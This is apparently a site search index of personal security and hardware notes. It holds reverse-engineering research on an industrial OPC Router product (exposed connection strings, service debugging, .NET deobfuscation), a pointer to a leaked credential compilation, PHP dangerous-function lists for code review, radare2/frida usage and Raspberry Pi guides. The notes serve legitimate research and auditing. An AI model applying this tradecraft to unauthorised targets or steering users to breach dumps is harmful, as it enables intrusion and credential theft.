Industriesoftware GmbH Holstenstra√üe 40, 25560 Schenefeld, Germany Phone: [+49 4892-89008-0](tel:+49 4892-89008-0) Email: [info@inray.de](mailto:info@inray.de) Web: [inray.de](https://www.inray.de/) DOWNLOAD LINKS:\nDemo Link Undirect Link After installation, double-click the \u0026ldquo;OPC Router Configuration\u0026rdquo; from the Windows Desktop. This will open a OPC Router GUI for configuration.\nPrior to exploring, we need to setup the lab as per the manual:\nRequires Accessible OPC Server to communicate with PLCs (OPC DA 4.0, UA, XML) - see below Accessible Database Server (MS SQL, Oracle, MySQL and all others via ODBC. MS Access and writing/reading XML files supported as well) for Oracle, you need additional Oracle instant client (ODAC) SAP plug-in supports SAP systems 4.0b or newer Enabling extensive LOG files in OCP Router Open OPC Router Configuration from the Desktop Shortcut Click Extras ‚Üí Settings from the Menu Bar Scroll to bottom of the Settings Pane/Tab Check all checkboxes in Log Output Starting OPC Router Service(s) Open OPC Router Configuration from the Desktop Shortcut Click Service ‚Üí Start from the Menu Bar Now you can open for example: C:\\OPCRouter4\\LogDir\\OPCRouterService_15.txt for detailed log output of a started service Observations By default, a connection string is visible in OCP Router Config Logfile from above Profiling:\n`15.05.21 21:44:34.574[Trace:DacPac] SqlConstantConnection: SERVER=(localdb)\\.\\OPCRouter4;DATABASE=OPCRouterConfig;Trusted_Connection=Yes;APP=OPC-Router;Pooling=false;Connect Timeout=30` `15.05.21 21:44:36.554[Trace:StorageManager] SqlConstantConnection: SERVER=(localdb)\\.\\OPCRouter4;DATABASE=OPCRouterConfig;Trusted_Connection=Yes;APP=OPC-Router;Pooling=false;Connect Timeout=30` `15.05.21 21:44:36.639[Trace:StorageManager] SqlConstantConnection: SERVER=(localdb)\\.\\OPCRouter4;Trusted_Connection=Yes;APP=OPC-Router;Pooling=false;Connect Timeout=30` `15.05.21 21:44:37.092[Trace:StorageManager] SqlConstantConnection: SERVER=(localdb)\\.\\OPCRouter4;DATABASE=OPCRouterLongTimeStorage;Trusted_Connection=Yes;APP=OPC-Router;Pooling=false;Connect Timeout=30` The application, when having started services running, have this information disclosed in State ‚Üí Service Status ‚Üí Dashboard. For example, see logs/Dashboard.xml on example:\nOPC Router 4 Service is starting at 15/05/2021 20:23:42 Starting RedundancyServerManager. Listening on port 49954 ... There are number of *.exe under OPC Router Installation Directory, as seen below:\n# =\u0026gt; SQLLocalDB\\inray.Data.SqlLocalDB.Service.exe PS C:\\OPCRouter4\u0026gt; C:\\OPCRouter4\\SQLLocalDB\\inray.Data.SqlLocalDB.Service.exe 02:39:14 Arguments are invalid! 02:39:14 inray.data.sqllocaldb.service.exe - inray.Data.LocalDB.Service - (c) Copyright by inray Industriesoftware Usage: inray.data.sqllocaldb.service.exe -n \u0026lt;arg\u0026gt; [-i -u] Available commands: ------------------- -n, --InstanceName The Name of the instance -i, --install install the service -u, --uninstall uninstall the service 02:39:14 \u0026lt;Enter\u0026gt; to continue... # =\u0026gt; It was also observed that the file *.config consists of XML key/val attributes # =\u0026gt; holding the Database settings PS C:\\OPCRouter4\u0026gt; more C:\\OPCRouter4\\SQLLocalDB\\inray.Data.SqlLocalDB.Service.exe.config | grep InitialDatabase -C 10 .... \u0026lt;DatabaseConfiguration\u0026gt; \u0026lt;InitialDatabases\u0026gt; \u0026lt;Database Name=\u0026#34;OPCRouterConfig\u0026#34; BackupFile=\u0026#34;Backup\\OPCRouterConfig.bak\u0026#34;/\u0026gt; \u0026lt;Database Name=\u0026#34;OPCRouterShortTimeStorage\u0026#34; BackupFile=\u0026#34;Backup\\OPCRouterShortTimeStorage.bak\u0026#34;/\u0026gt; \u0026lt;Database Name=\u0026#34;OPCRouterLongTimeStorage\u0026#34; BackupFile=\u0026#34;Backup\\OPCRouterLongTimeStorage.bak\u0026#34;/\u0026gt; \u0026lt;Database Name=\u0026#34;OPCRouterRuntime\u0026#34; BackupFile=\u0026#34;Backup\\OPCRouterRuntime.bak\u0026#34;/\u0026gt; \u0026lt;/InitialDatabases\u0026gt; \u0026lt;/DatabaseConfiguration\u0026gt; \u0026lt;/configuration\u0026gt; # =\u0026gt; Later, it was discovered that intensive Log Files were also discovered in that subdirectory, as shown: PS C:\\OPCRouter4\\SQLLocalDB\\LogDir\u0026gt; ls Directory: C:\\OPCRouter4\\SQLLocalDB\\LogDir Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 15. 5. 2021. 23:59 256287 LoggerBase_15.txt -a---- 16. 5. 2021. 02:44 286907 LoggerBase_16.txt # =\u0026gt; @see logs/LoggerBase_16.txt for example # =\u0026gt; When using Process Explorer, there is a process (service) created and running # =\u0026gt; that shows the above utility running: # =\u0026gt; Process Explorer shows running this service as: C:\\OPCRouter4\\SQLLocalDB\\inray.Data.SqlLocalDB.Service.exe -s -n \u0026#34;OPCRouter4\u0026#34; # =\u0026gt; To kill/debug server, you need to open Microsoft Windows # =\u0026gt; Control Panel and disable the Service # =\u0026gt; A registry editor shows this path for the above service # Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\OPCRouter4-LocalDB # =\u0026gt; Disable service using below window from \u0026#34;Services\u0026#34; (Control Panel), and then # =\u0026gt; we can symlink this database for further exploration # =\u0026gt; MINGW64:/c/ Test Account@DESKTOP-RONDJPT MINGW64 /c $ ln -fs /c/OPCRouter4/ \u0026#34;//vmware-host/Shared Folders/InstallDir\u0026#34; # =\u0026gt; Now resume the service via exe path shown in \u0026#39;Services\u0026#39; To debug the above server, I used approach described here:\nReference # =\u0026gt; Run Windows Terminal with Admin Privs, and then: # Use gflags.exe to map Image File as a Service PS C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\u0026gt; .\\gflags.exe ... set as in below image and click Apply -\u0026gt; Launch ... ## Image: C:\\OPCRouter4\\SQLLocalDB\\inray.Data.SqlLocalDB.Service.exe -s -n \u0026#34;OPCRouter4\u0026#34; ## Debugger: C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe -server tcp:port=5005 -c \u0026#34;g\u0026#34; # Use WinDbg to connect to host PS C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\u0026gt; .\\windbg.exe --remote tcp:Port=5005,Server=127.0.0.1 # ... or attach via PID (that is, gflags.exe PID) Additional directory \u0026amp; files exists through the app lifecycle. For example, using API Monitor + SysMon we gathered these additional queries by the application, specifically in the directory C:\\ProgramData\\inray as well as %appdata%\\Local\\inray_industriesoftware_G:\n# =\u0026gt; Discovering more bin/lib(s) PS C:\\ProgramData\\inray\\AppSettings\u0026gt; more .\\OPCRouter4\\OPCRouter4.settings ... \u0026lt;/Password\u0026gt; \u0026lt;RuntimeCatalog\u0026gt;OPCRouterRuntime\u0026lt;/RuntimeCatalog\u0026gt; \u0026lt;Port\u0026gt;1433\u0026lt;/Port\u0026gt; \u0026lt;ConnectionTimeout\u0026gt;30\u0026lt;/ConnectionTimeout\u0026gt; \u0026lt;ConfigCatalog\u0026gt;OPCRouterConfig\u0026lt;/ConfigCatalog\u0026gt; \u0026lt;IntegratedSecurity\u0026gt;True\u0026lt;/IntegratedSecurity\u0026gt; \u0026lt;DatabaseServer\u0026gt;(localdb)\\.\\OPCRouter4\u0026lt;/DatabaseServer\u0026gt; # =\u0026gt; I copied this data in ~/Program Data/ directory of this project # =\u0026gt; @see: OPCRouter_OPC-Server@AR\\ProgramData\\inray --- # =\u0026gt; Likewise, in %appdata% directory, a user.config files are hidding PS C:\\Users\\Test Account\\AppData\\Local\\inray_Industriesoftware_G\u0026gt; ls Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 16. 5. 2021. 08:08 inray.Tool.DacPacDeploy.e_Url_wdxasxd1lwq2m54joacwxw1hqc3mijhx d----- 15. 5. 2021. 21:44 OPCRouterConfig.exe_StrongName_jw3q4nghqgrybwap5koxvkruxpapvd5j # =\u0026gt; I copied this data in ~/AppData_Local/ directory of this project # =\u0026gt; @see: OPCRouter_OPC-Server@AR\\AppData_Local\\inray_Industriesoftware_G During the File Monitor and File System analysis, I discovered a hidden (ie. Isolated Storage) identity being accessed from the Application:\nUse this for reference:\n# =\u0026gt; ./filemon ... identity.dat\tRead Write ReadAttributes Synchronize\tSUCCESS\t4\t5,89\t0.0.0.0\tC:\\Users\\Test Account\\AppData\\Local\\IsolatedStorage\\hfyw1qvw.lyh\\bfyk5gc3.2tn\\StrongName.q23pcsbq0aqsyq1ss2yaivhiqs3zep4o\\identity.dat ... # =\u0026gt; I made a backup of this directory for further research # =\u0026gt; @see: OPCRouter_OPC-Server@AR\\AppData_Local\\isolatedStorage\\StrongName.q23pcsbq0aqsyq1ss2yaivhiqs3zep4o All instances of database service(s) are visible in the next directory:\nC:\\Windows\\ServiceProfiles\\OPCRouter4-LocalDB\\AppData\\Local\\Microsoft\\Microsoft SQL Server Local DB\\Instances\\OPCRouter4\nAdditionally, using RegEdit.exe you can point to the next path and see observables used for Token Invocations:\nComputer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Microsoft SQL Server Local DB\\Shared Instances\\OPCRouter4 Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\inray Industriesoftware GmbH\\OPC-Router Deobfuscation C:\\tools\\de4dot-net45\\de4dot.exe -r c:\\input -ru -ro c:\\output # =\u0026gt; decompile with autodetection from stdin to stdout C:\\tools\\de4dot-net45\\de4dot.exe -d -r C:\\OPCRouter4\\ -ru -ro C:\\OPCRouter4-De\\ # =\u0026gt; detection only, skips unsupported obfuscators due to -ru C:\\tools\\de4dot-net45\\de4dot-x64.exe -f C:\\OPCRouter4\\OPCRouterConfig.exe -o C:\\OPCRouter4-De\\OPCRouterConfig.exe -p dr3 # =\u0026gt; uses .net reactor which works C:\\tools\\de4dot-net45\\de4dot.exe -r C:\\OPCRouter4\\ -ru -ro C:\\OPCRouter4-De-netr3\\ -p dr3 # =\u0026gt; not supported (recursive + specify cryptor) OPC Server As per OPC Router documentation, an OPC Server is required for data aggregation from Process Network layer.\nDo you need an OPC Server? If you also require an OPC Server for your project, we recommend the Kepware OPC Server: * https://www.kepware.com/en-us/products/kepserverex/ The Kepware OPC Server provides more than 160 communication drivers and can therefore be used for connecting many different control systems and IoT devices. References:\nDemo Download Install Guide Documentation / Manuals Another option for OPC Server is to use MatrikonPC\u0026rsquo;s version available as a free/shareware on their website. I saw this paper being used in a Lab environment when reading \u0026ldquo;Penetration Testing of OPC as Part of Process Control Systems\u0026quot; doi:10.1007/978-3-540-69293-5_22\nDownload Link Resources:\nhttp://alvarestech.com/temp/smar/2019/OPC%20and%20DCOM%20-%205%20things%20you%20need%20to%20know%20-%20Windows%2010.pdf https://github.com/Engineering-Research-and-Development/opc-ua-car-server https://www.matrikonopc.com/resources/dictionary.aspx OPC Test:\nCisco Notes Other Tools:\nbinwalk Frida uniextractor pegasus for windbg dependecywalker fribratus ", 
        "url": "\/opcrouter-research\/"
    },
    
    
    
    "\/osint\/": {
        
        "title": "OSINT",
        "tags": [],
        "content": "Breach Compilation (1.4BILL) ", 
        "url": "\/osint\/"
    },
    
    
    
    "\/php-filesystem-functions\/": {
        
        "title": "PHP Filesystem Functions",
        "tags": [],
        "content": "Filesystem functions analysis as a part of PHP Source Code Analysis:\n// open filesystem handler fopen tmpfile bzopen gzopen SplFileObject-\u0026gt;__construct // write to filesystem (partially in combination with reading) chgrp chmod chown copy file_put_contents lchgrp lchown link mkdir move_uploaded_file rename rmdir symlink tempnam touch unlink imagepng - 2nd parameter is a path. imagewbmp - 2nd parameter is a path. image2wbmp - 2nd parameter is a path. imagejpeg - 2nd parameter is a path. imagexbm - 2nd parameter is a path. imagegif - 2nd parameter is a path. imagegd - 2nd parameter is a path. imagegd2 - 2nd parameter is a path. iptcembed ftp_get ftp_nb_get // read from filesystem file_exists file_get_contents file fileatime filectime filegroup fileinode filemtime fileowner fileperms filesize filetype glob is_dir is_executable is_file is_link is_readable is_uploaded_file is_writable is_writeable linkinfo lstat parse_ini_file pathinfo readfile readlink realpath stat gzfile readgzfile getimagesize imagecreatefromgif imagecreatefromjpeg imagecreatefrompng imagecreatefromwbmp imagecreatefromxbm imagecreatefromxpm ftp_put ftp_nb_put exif_read_data read_exif_data exif_thumbnail exif_imagetype hash_file hash_hmac_file hash_update_file md5_file sha1_file highlight_file show_source php_strip_whitespace get_meta_tags ", 
        "url": "\/php-filesystem-functions\/"
    },
    
    
    
    "\/php-source-code-analysis\/": {
        
        "title": "PHP Source Code Analysis",
        "tags": [],
        "content": "When looking at PHP applications and source code analysis process, one of the first things I grep and search for are for functions accepting $USER input with the potential to execute an external program or malform the input in some form or action:\nUse this grep command\n$ grep -nR \u0026#34;exec(\u0026#34; ./phpBB/ --include \\*.*php* | more` Important Function\nassert() create_function() eval() exec() Execution Operators (``) include() include_once() passthru() pcntl_exec() popen() preg_replace() (with `/e` modifier) proc_open() ReflectionFunction (class) require() require_once() shell_exec() system() Command Execution\nexec - Returns last line of commands output passthru - Passes commands output directly to the browser system - Passes commands output directly to the browser and returns last line shell_exec - Returns commands output `` (backticks) - Same as shell_exec() popen - Opens read or write pipe to process of a command proc_open - Similar to popen() but greater degree of control pcntl_exec - Executes a program PHP Code Execution\neval() assert() - identical to eval() preg_replace(\u0026#39;/.*/e\u0026#39;,...) - /e does an eval() on the match create_function() include() include_once() require() require_once() $_GET[\u0026#39;func_name\u0026#39;]($_GET[\u0026#39;argument\u0026#39;]); $func = new ReflectionFunction($_GET[\u0026#39;func_name\u0026#39;]); $func-\u0026gt;invoke(); or $func-\u0026gt;invokeArgs(array()); List of Functions which accept callbacks\nFunction =\u0026gt; Position of callback arguments \u0026#39;ob_start\u0026#39; =\u0026gt; 0, \u0026#39;array_diff_uassoc\u0026#39; =\u0026gt; -1, \u0026#39;array_diff_ukey\u0026#39; =\u0026gt; -1, \u0026#39;array_filter\u0026#39; =\u0026gt; 1, \u0026#39;array_intersect_uassoc\u0026#39; =\u0026gt; -1, \u0026#39;array_intersect_ukey\u0026#39; =\u0026gt; -1, \u0026#39;array_map\u0026#39; =\u0026gt; 0, \u0026#39;array_reduce\u0026#39; =\u0026gt; 1, \u0026#39;array_udiff_assoc\u0026#39; =\u0026gt; -1, \u0026#39;array_udiff_uassoc\u0026#39; =\u0026gt; array(-1, -2), \u0026#39;array_udiff\u0026#39; =\u0026gt; -1, \u0026#39;array_uintersect_assoc\u0026#39; =\u0026gt; -1, \u0026#39;array_uintersect_uassoc\u0026#39; =\u0026gt; array(-1, -2), \u0026#39;array_uintersect\u0026#39; =\u0026gt; -1, \u0026#39;array_walk_recursive\u0026#39; =\u0026gt; 1, \u0026#39;array_walk\u0026#39; =\u0026gt; 1, \u0026#39;assert_options\u0026#39; =\u0026gt; 1, \u0026#39;uasort\u0026#39; =\u0026gt; 1, \u0026#39;uksort\u0026#39; =\u0026gt; 1, \u0026#39;usort\u0026#39; =\u0026gt; 1, \u0026#39;preg_replace_callback\u0026#39; =\u0026gt; 1, \u0026#39;spl_autoload_register\u0026#39; =\u0026gt; 0, \u0026#39;iterator_apply\u0026#39; =\u0026gt; 1, \u0026#39;call_user_func\u0026#39; =\u0026gt; 0, \u0026#39;call_user_func_array\u0026#39; =\u0026gt; 0, \u0026#39;register_shutdown_function\u0026#39; =\u0026gt; 0, \u0026#39;register_tick_function\u0026#39; =\u0026gt; 0, \u0026#39;set_error_handler\u0026#39; =\u0026gt; 0, \u0026#39;set_exception_handler\u0026#39; =\u0026gt; 0, \u0026#39;session_set_save_handler\u0026#39; =\u0026gt; array(0, 1, 2, 3, 4, 5), \u0026#39;sqlite_create_aggregate\u0026#39; =\u0026gt; array(2, 3), \u0026#39;sqlite_create_function\u0026#39; =\u0026gt; 2, Information Disclosure\nphpinfo posix_mkfifo posix_getlogin posix_ttyname getenv get_current_user proc_get_status get_cfg_var disk_free_space disk_total_space diskfreespace getcwd getlastmo getmygid getmyinode getmypid getmyuid Other Notable Functions\nextract - Opens the door for register_globals attacks (see study in scarlet). parse_str - works like extract if only one argument is given. putenv ini_set mail - has CRLF injection in the 3rd parameter, opens the door for spam. header - on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header(\u0026#34;location: ...\u0026#34;); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area. proc_nice proc_terminate proc_close pfsockopen fsockopen apache_child_terminate posix_kill posix_mkfifo posix_setpgid posix_setsid posix_setuid Filesystem Functions\nRead up more on PHP Filesystem Functions. Investigate all filesystem handlers as a part of the analysis.\nReferences\nStackoverflow (1), Stackoverflow (2), SecLists.org\n", 
        "url": "\/php-source-code-analysis\/"
    },
    
    
    
    "\/posts\/": {
        
        "title": "Posts",
        "tags": [],
        "content": "", 
        "url": "\/posts\/"
    },
    
    
    
    "\/potentiometers\/": {
        
        "title": "Potentiometers",
        "tags": [],
        "content": "A Potentiometer produces a gradually changing voltage signal to a Control Module. The signal is infinitely variable, with-in the operating range of the sensor.\nThis varying voltage reflects a mechanical movement or position of the potentiometer internal arm and its related components.\nPotentiometer - Signal internal flow Typical Application of Potentiometers Pedal Position Sensors Throttle Position Sensors Feedback Potentiometers \u0026hellip; ", 
        "url": "\/potentiometers\/"
    },
    
    
    
    "\/ptc-sensors\/": {
        
        "title": "PTC Sensors",
        "tags": [],
        "content": "PTC (Positive Temperature Coefficient) sensors is a type of DC Analog Sensor which change resistance based on temperature.\nIn a PTC sensor, as the temperature goes up, the resistance also goes up. The increase in resistance causes the voltage drop across the sensor to increase, and the input signal voltage at the Control Module increases.\nWhen troubleshooting a faulty input display, the input signal must be verified as VALID before the Control Module is replaced.\nWhen checking a PTC/NTC Sensor, look for these voltages and problems:\nIf it\u0026rsquo;s 0V, no supply voltage or shorted to ground If it\u0026rsquo;s 2V, sensor is indicating a warm condition for system being measured If it\u0026rsquo;s 4V, sensor is indicating a cold condition for system being measured If it\u0026rsquo;s 5V, sensor or wiring harness is open Remember: A PTC type sensor will indicate opposite results on intermediate readings (i.e. 4V, sensor is indicating warm condition).\n", 
        "url": "\/ptc-sensors\/"
    },
    
    
    
    "\/pure-reverse-engineering\/": {
        
        "title": "Pure Reverse Engineering",
        "tags": [],
        "content": "Some RE Tricks and Tips have been shared here. Otherwise, check references at the bottom of these notes.\nUse Byteman to instrument compiled Java application and *.jar files. A sample script has been included in the notes.\nHopper Disassembler In case Hopper Disassembler is Not Responding (sometimes due to large binary/analysis), you can:\nWait a bit more, close all unused apps, especially (Chrome) tabs Open Activity Monitor and check Hopper Disassembler process details If nothing works, use the command below to purge all unused virtual memory $ purge # =\u0026gt; ... wait a bit # =\u0026gt; hopper disas. should be unfrezzed and responding Windows Reverse Engineering FindEXEC - sorting script, sorts exe/dll based on category (NET/Native/etc.) EasyHook - a hooking engine for DLLs and .NET (3.5|4.0) assemblies frida-scripts for WindowsNT - Inject JS and C# into Windows apps Binary Data Reverse Engineering binkit - Binary Reverse Engineering Data Science Kit symbolizer - A fast execution trace symbolizer for Windows References\nDebugging iOS binaries with lldb Bypass Flutter SSL Pinning (2021) Frida Android Function Enumerator and Dumper static-arm-bins - statically compiled ARM binaries for debugging ", 
        "url": "\/pure-reverse-engineering\/"
    },
    
    
    
    "\/r2frida\/": {
        
        "title": "r2frida",
        "tags": [],
        "content": "r2frida is a self-contained plugin for radare2 that allows to instrument remote processes using frida.\nThe recommended way to install r2frida is via r2pm:\n$ r2pm -ci r2frida Usage For testing, use r2 frida://0, as attaching to the pid0 in frida is a special session that runs in local. Now you can run the :? command to get the list of commands available.\n$ r2 \u0026#39;frida://?\u0026#39; r2 frida://[action]/[link]/[device]/[target] * action = list | apps | attach | spawn | launch * link = local | usb | remote host:port # ... Examples Connect to local session\n$ r2 frida://0 # same as frida -p 0, connects to a local session You can attach, spawn or launch to any program by name or pid, The following line will attach to the first process named rax2 (run rax2 - in another terminal to test this line)\n$ r2 frida://rax2 # attach to the first process named `rax2` $ r2 frida://1234 # attach to the given pid Using the absolute path of a binary to spawn will spawn the process:\n$ r2 frida:///bin/ls [0x00000000]\u0026gt; :dc # continue the execution of the target program Also works with arguments:\n$ r2 frida://\u0026#34;/bin/ls -al\u0026#34; For USB debugging iOS/Android apps use these actions. Note that spawn can be replaced with launch or attach, and the process name can be the bundleid or the PID.\n$ r2 frida://spawn/usb/ # enumerate devices $ r2 frida://spawn/usb// # enumerate apps in the first iOS device $ r2 frida://spawn/usb//Weather # Run the weather app Commands These are the most frequent commands, so you must learn them and suffix it with ? to get subcommands help.\n:i # get information of the target (pid, name, home, arch, bits, ..) .:i* # import the target process details into local r2 :? # show all the available commands :dm # list maps. Use \u0026#39;:dm|head\u0026#39; and seek to the program base address :iE # list the exports of the current binary (seek) :dt fread # trace the \u0026#39;fread\u0026#39; function :dt-* # delete all traces # more commands @ https://github.com/vadimszzz/iOS-Internals-and-Security-Testing#commands References Troubleshooting r2frida-wiki ", 
        "url": "\/r2frida\/"
    },
    
    
    
    "\/radare2\/": {
        
        "title": "radare2",
        "tags": [],
        "content": "radare2 (commonly refered as r2) is UNIX-like reverse engineering framework and command-line toolset. r2 is a complete rewrite of radare. It provides a set of libraries, tools and plugins to ease reverse engineering tasks.\nThe radare project started as a simple command-line hexadecimal editor focused on forensics. Today, r2 is a featureful low-level command-line tool with support for scripting. r2 can edit files on local hard drives, view kernel memory, and debug programs locally or via a remote gdb server. r2\u0026rsquo;s wide architecture support allows you to analyze, emulate, debug, modify, and disassemble any binary.\nInstallation\nYou can either use r2env¬†Python package, or install via brew:\n# =\u0026gt; prefered way if you need to switch between different versions $ pip install -U r2env $ r2env init $ r2env add radare2@git # =\u0026gt; standalone brew package $ brew install radare2 Usage\nAll r2 tools and commands support printing the output in different formats by appending a character at the end or using the -r (*r2) and -j (json) flags. Check out the manpages and help messages for more information (man r2).\nradare2:\n# =\u0026gt; loading binary in CLI and executing r2 REPL commands $ r2 /bin/ls # open the binary in read-only mode # \u0026gt; aaa # same as r2 -A, analyse the binary # \u0026gt; afl # list all functions (try aflt, aflm) # \u0026gt; px 32 # print 32 byte hexdump current block # \u0026gt; s sym.main # seek to the given offset (by flag name, number, ..) # \u0026gt; f~foo # filter flags with ~grep (same as |grep) # \u0026gt; iS;is # list sections and symbols (same as rabin2 -Ss) # \u0026gt; pdf; agf # print function and show control-flow-graph in ascii-art # \u0026gt; oo+;w hello # reopen in rw mode and write a string in the current offset # \u0026gt; ?*~... # interactive filter all command help messages # \u0026gt; q # quit rasm2:\n$ rasm2 -L # list all supported assembler/disassembler/emulator plugins $ rasm2 -a arm -b 64 \u0026#39;nop\u0026#39; # assemble a nop in 64-bit ARM $ rasm2 -d 90 # disassemble 0x90; nop, if you\u0026#39;re using x86 rabin2\n$ rabin2 -s /bin/ls # list symbols in a binary $ rabin2 -z /bin/ls # find strings rax2\n$ rax2 \u0026#39;10+0x20\u0026#39; # compute the result $ rax2 -k 10+32 # keep the same base as input (10) $ rax2 -h # convert between (hex, octal, decimal.. bases) Plugins\nMany plugins are included in r2 by default. But you can extend its capabilities by using the r2pm package manager.\n$ r2pm -s \u0026lt;word\u0026gt; # search package by word $ r2pm -ci \u0026lt;pkg\u0026gt; # install a package Scripting\nThere are native API bindings available for many programming languages, but it is recommended to use r2pipe which is a simple interface to execute r2 commands and get the output in result.\nimport r2pipe r2 = r2pipe.open(\u0026#34;/bin/ls\u0026#34;) print(r2.cmd(\u0026#34;pd 10\u0026#34;)) r2.quit() Resources\nr2 Book Usage manpages ", 
        "url": "\/radare2\/"
    },
    
    
    
    "\/raspberry-pi-quick-guide\/": {
        
        "title": "Raspberry Pi Quick Guide",
        "tags": [],
        "content": "Installation Use NOOBS or Raspberry Pi official image for hardware environment (ie. PCBs, Electrical Engineering, Breadboard Wiring, Prototypes et al.) Use SD Card Formatter to quickly partition-overwrite whole SD Card Disk Use balenaEtcher to quickly write arm_os of your choice Use Raspberry Pi Imager to quickly write Raspbian OS with custom configuration Configuration Upon installing your favorite *.img¬†on your SD Card, make sure to boot the Raspberry Pi at least once, to finish configuration wizard with-in Raspbian OS. Your Raspberry Pi will not boot up!, unless you go through this wizard at least once (requires monitor/mouse/kb).\nYou can check your Hostname configuration, by issuing command on your Pi:\n$ hostname -I You can use the hostname¬†value, rather then directly connecting to the IP address (if not set statically).\n$ ping pi@raspberrypi.local Make sure to configure WiFi connection as well.\nSet APT sources to closer country Search Raspbian Mirros on official website, and select the country closest to yours. Here is the example with Slovenia:\nEurope* Slovenia ARNES (ftp|http)://ftp.arnes.si/mirrors/raspbian/raspbian rsync://ftp.arnes.si/raspbian/ Edit the sources.list:\n$ sudo vim /etc/apt/sources.list # =\u0026gt; comment the first `# deb` line, and add this below it # dep http://ftp.arnes.si/mirrors/raspbian/raspbian/ bullseye main contrib non-free rpi Update the changes:\n$ sudo apt update Upgrading the System Packages is simple as:\n$ sudo apt upgrade -y Upgrading Rasbian OS Kernel Updating Raspberry Pi packages (Tested)\nFor details check Raspberry Pi documentation on updating and upgrading the OS.\n# =\u0026gt; full-upgrade is used in preference to a simple upgrade, as it also picks up any dependency changes that may have been made $ sudo apt full-upgrade Updating Raspberry Pi Kernel (Untested)\nUsing rpi-update will update your Raspberry Pi OS kernel and VideoCore firmware to the latest pre-release versions.\n$ sudo rpi-update $ sudo reboot For a full list of options, check documentation in the rpi-update repository.\nDowngrading Raspbian OS Kernel If you have done an rpi-update and things are not working as you wish, if your Raspberry Pi is still bootable you can return to the stable release using:\n$ sudo apt-get update $ sudo apt install --reinstall libraspberrypi0 libraspberrypi-{bin,dev,doc} raspberrypi-bootloader raspberrypi-kernel Update Raspberry Pi EEPROM Updating the bootloader of your Raspberry Pi to the latest preview version is an optional step. You may perform this only if you are facing any problems with your Pi.\nYou can check whether any updates are available for install by running the following command.\n$ sudo rpi-eeprom-update If any available update is there, you can give the following command to update Raspberry Pi EEPROM.\n$ sudo rpi-eeprom-update -a $ sudo reboot Clean Up some space You can do some clean to remove all cached .deb archived stored in /var/cache/apt/archives:\n$ sudo apt clean Post-install Settings Remove the SD Card from your Raspberry Pi after base configuration and wizard setup, and use your MacOS to mount it in your working directory. The instructions are under MacOS Notes down to the bottom.\nInsert SD Card in your card reader Make a directory for mounting Linux partition Make changes to the Raspbian OS directly from /boot You can use this to edit boot configuration files, enable SSH etc. directly from your Raspbian HDD.\nRead the following to Enable SSH on via SD Card.\nInstall VNC on Raspberry Pi The standard image of the Raspberry Pi OS comes with RealVNC Connect software. If required for a custom OS, do it via:\n$ sudo apt install realvnc-vnc-server realvnc-vnc-viewer Otherwise, use raspi-config from the Terminal, and enable the VNC in:\nInterface Options =\u0026gt; VNC =\u0026gt; Enable VNC Display Options =\u0026gt; VNC Resolution =\u0026gt; 1280x1024 System Options =\u0026gt; Boot / Auto Login =\u0026gt; Desktop Autologin =\u0026gt; Enable Upon changing the settings, reboot your Raspberry Pi and connect from the MacOS using VNCViewer.\nReferences and Links Raspberry Pi Official Documentation RPI Configuration Parameters Raspberry Pi Guide ", 
        "url": "\/raspberry-pi-quick-guide\/"
    },
    
    
    
    "\/reverse-engineering-tricks-and-tips\/": {
        
        "title": "Reverse Engineering Tricks and Tips",
        "tags": [],
        "content": " Find threads by patching a jump with a short jump (EB FE) to create an endless loop you can then search for Looking for \u0026ldquo;CO A8\u0026rdquo; to find local IP addr prefix (192.168) Looking for 4-byte Unix timestamps in hex in a file format or a network packet Search/google all application constant values, classes and libraries Resize Hex Editor window to identify unknown structures and its sizes Check application Log messages and Xref them Replace all https calls with http (instead of hooking on each TLS thread and decrypting SSL) Using LD_PRELOAD to disable specific functions or patching binaries on the fly Use Burp + mitm_relay to proxy traffic Decompile JAR and attack via Frida, Byteman or any other dynamic instrumentation toolkit Use dotPeek to identify and process attack surface for anything .NET based ", 
        "url": "\/reverse-engineering-tricks-and-tips\/"
    },
    
    
    
    "\/sbc-and-alternatives\/": {
        
        "title": "SBC and Alternatives",
        "tags": [],
        "content": "This document explains common use during the operation of SBC (Single-board Computers), such is Raspberry Pi, Banana Pi and others.\nDetail instruction for SBC(s) below:\nRaspberry Pi Installation and Configuration Banana Pro Installation and Configuration Check How to mount SD Cards notes for instruction on how to mount /boot and ext4 partitions directly from the Host OS. Some ext4 partition mounting explained in MacOS Notes.\nDetailed instructions for Enabling SSH on Raspbian OS are also available.\nRaspberry Pi GPIO A powerful feature of the Raspberry Pi is the row of GPIO (general-purpose input/output) pins along the top edge of the board. A 40-pin GPIO header is found on all current Raspberry Pi boards (unpopulated on Raspberry Pi Zero, Raspberry Pi Zero W and Raspberry Pi Zero 2 W). Prior to the Raspberry Pi 1 Model B+ (2014), boards comprised a shorter 26-pin header.\nAny of the GPIO pins can be designated (in software) as an input or output pin and used for a wide range of purposes.\nA handy reference can be accessed on the Raspberry Pi by opening a terminal window and running the command pinout.\nGPIO and the 40-pin Headers ", 
        "url": "\/sbc-and-alternatives\/"
    },
    
    
    
    "\/server-anywhere\/": {
        
        "title": "Server Anywhere",
        "tags": [],
